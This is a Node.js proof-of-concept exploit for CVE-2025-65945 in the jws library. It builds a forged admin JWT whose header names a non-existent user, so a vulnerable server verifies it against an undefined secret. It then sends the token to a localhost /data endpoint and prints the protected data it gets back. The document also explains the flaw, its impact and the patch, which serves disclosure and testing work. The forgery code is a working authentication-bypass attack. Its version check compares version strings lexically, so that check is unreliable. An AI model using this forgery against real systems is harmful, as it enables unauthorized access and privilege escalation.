/**
 * CVE-2025-65945 Exploit / POC Tool
 * 
 * This tool demonstrates how to exploit the vulnerability in jws < 3.2.3
 * to bypass JWT signature verification.
 * 
 * The exploit works by:
 * 1. Creating a JWT token with arbitrary claims
 * 2. Manipulating the header 'user' field to a non-existent value
 * 3. This causes the vulnerable app to lookup undefined as the secret
 * 4. In jws < 3.2.3, undefined secret bypasses signature verification
 */

const jws = require('jws');
const axios = require('axios');

const BASE_URL = 'http://localhost:3000';

// Color codes for terminal output
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m'
};

function log(color, message) {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

/**
 * Create a forged JWT token that exploits CVE-2025-65945
 * 
 * @param {string} targetRole - The role to impersonate (e.g., 'admin')
 * @param {string} targetUser - The username to impersonate
 * @returns {string} - Forged JWT token
 */
function createForgedToken(targetRole = 'admin', targetUser = 'admin') {
  log('cyan', '\n[*] Creating forged JWT token...');

  // Create a JWT with fake signature
  // The key is to set a non-existent user in the header
  const header = {
    alg: 'HS256',
    user: 'nonexistent_user_12345' // This user doesn't exist, so secret will be undefined
  };

  const payload = {
    username: targetUser,
    role: targetRole,
    exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour expiry
  };

  // Sign with any random secret - it doesn't matter because verification will be bypassed
  const fakeSecret = 'any-random-secret';
  
  const token = jws.sign({
    header: header,
    payload: payload,
    secret: fakeSecret
  });

  log('green', `[+] Forged token created!`);
  log('yellow', `[+] Header user field: ${header.user} (non-existent)`);
  log('yellow', `[+] Payload role: ${payload.role}`);
  log('yellow', `[+] Payload username: ${payload.username}`);

  return token;
}

/**
 * Test legitimate login
 */
async function testLegitimateLogin() {
  log('blue', '\n=== Testing Legitimate Login ===');

  try {
    const response = await axios.post(`${BASE_URL}/login`, {
      username: 'user1',
      password: 'password1'
    });

    log('green', '[+] Legitimate login successful');
    log('yellow', `[+] Token: ${response.data.token.substring(0, 50)}...`);

    // Try to access data with legitimate token
    const dataResponse = await axios.get(`${BASE_URL}/data`, {
      headers: {
        'Authorization': `Bearer ${response.data.token}`
      }
    });

    log('green', '[+] Data access with legitimate token:');
    log('yellow', `    Role: ${dataResponse.data.role}`);
    log('yellow', `    Data: ${dataResponse.data.data}`);

  } catch (error) {
    log('red', `[-] Legitimate login failed: ${error.message}`);
  }
}

/**
 * Test the exploit
 */
async function testExploit() {
  log('blue', '\n=== Testing CVE-2025-65945 Exploit ===');

  try {
    // Create forged admin token
    const forgedToken = createForgedToken('admin', 'admin');

    log('cyan', '\n[*] Attempting to access protected data with forged token...');

    // Try to access data with forged token
    const response = await axios.get(`${BASE_URL}/data`, {
      headers: {
        'Authorization': `Bearer ${forgedToken}`
      }
    });

    log('green', '\n[+] EXPLOIT SUCCESSFUL! Bypassed JWT verification!');
    log('green', '[+] Accessed protected data without valid signature:');
    log('magenta', `    Username: ${response.data.username}`);
    log('magenta', `    Role: ${response.data.role}`);
    log('magenta', `    Data: ${response.data.data}`);
    log('green', '\n[+] This proves the vulnerability CVE-2025-65945 exists!');

  } catch (error) {
    if (error.response) {
      log('red', `[-] Exploit failed: ${error.response.data.message}`);
      log('yellow', `[*] This might indicate the vulnerability has been patched`);
    } else {
      log('red', `[-] Error: ${error.message}`);
      log('yellow', `[*] Is the vulnerable server running? (npm start)`);
    }
  }
}

/**
 * Demonstrate the vulnerability details
 */
function explainVulnerability() {
  log('blue', '\n=== CVE-2025-65945 Vulnerability Explanation ===\n');
  
  console.log('The vulnerability exists in jws versions < 3.2.3 and >= 4.0.0 < 4.0.1');
  console.log('\nVulnerability Details:');
  console.log('1. The application uses jws.createVerify() with HS256 algorithm');
  console.log('2. The secret is looked up based on user-provided data from JWT header');
  console.log('3. If the user provides a non-existent identifier, secret becomes undefined');
  console.log('4. In vulnerable jws versions, undefined secret bypasses signature verification\n');
  
  console.log('Exploit Process:');
  console.log('1. Create a JWT with arbitrary payload (e.g., role: admin)');
  console.log('2. Set header.user to a non-existent value');
  console.log('3. Sign with any random secret');
  console.log('4. Send the forged token to the server');
  console.log('5. Server looks up undefined secret and verification passes!\n');
  
  console.log('Impact:');
  console.log('- Authentication bypass');
  console.log('- Privilege escalation (user -> admin)');
  console.log('- Access to sensitive data\n');
  
  console.log('Fix:');
  console.log('- Upgrade jws to version 3.2.3, 4.0.1 or higher');
  console.log('- Versions >= 3.2.3 throw TypeError when secret is null/undefined for HMAC algorithms\n');
}

/**
 * Compare vulnerable vs patched behavior
 */
function compareVersions() {
  log('blue', '\n=== Version Comparison ===\n');
  
  console.log('Vulnerable versions: jws < 3.2.3, jws >= 4.0.0 < 4.0.1');
  console.log('Patched versions: jws >= 3.2.3, jws >= 4.0.1\n');
  
  console.log('Current jws version:', require('jws/package.json').version);
  
  const currentVersion = require('jws/package.json').version;
  const isVulnerable = currentVersion < '3.2.3' || 
                       (currentVersion >= '4.0.0' && currentVersion < '4.0.1');
  
  if (isVulnerable) {
    log('red', '⚠️  This version IS VULNERABLE to CVE-2025-65945');
  } else {
    log('green', '✓ This version is PATCHED against CVE-2025-65945');
  }
  
  console.log('\nKey changes in the patch:');
  console.log('- Added validation in VerifyStream constructor');
  console.log('- Throws TypeError if secret is null/undefined for HMAC algorithms (HS256, HS384, HS512)');
  console.log('- Code change:');
  console.log('  if (/^hs/i.test(opts.algorithm) === true && secretOrKey == null) {');
  console.log('    throw new TypeError(\'secret must be a string or buffer or a KeyObject\')');
  console.log('  }');
}

/**
 * Main function
 */
async function main() {
  log('magenta', '\n╔════════════════════════════════════════════════════╗');
  log('magenta', '║   CVE-2025-65945 POC - JWT Signature Bypass       ║');
  log('magenta', '║   Improper Verification in node-jws < 3.2.3       ║');
  log('magenta', '╚════════════════════════════════════════════════════╝');

  explainVulnerability();
  compareVersions();

  // Wait for user to start the server
  log('yellow', '\n[!] Make sure the vulnerable server is running (npm start in another terminal)');
  log('yellow', '[!] Press Ctrl+C to exit or wait for tests to run...\n');

  await new Promise(resolve => setTimeout(resolve, 2000));

  // Run tests
  await testLegitimateLogin();
  await testExploit();

  log('cyan', '\n=== POC Complete ===\n');
}

// Run the POC
main().catch(error => {
  log('red', `\n[!] Fatal error: ${error.message}`);
  process.exit(1);
});
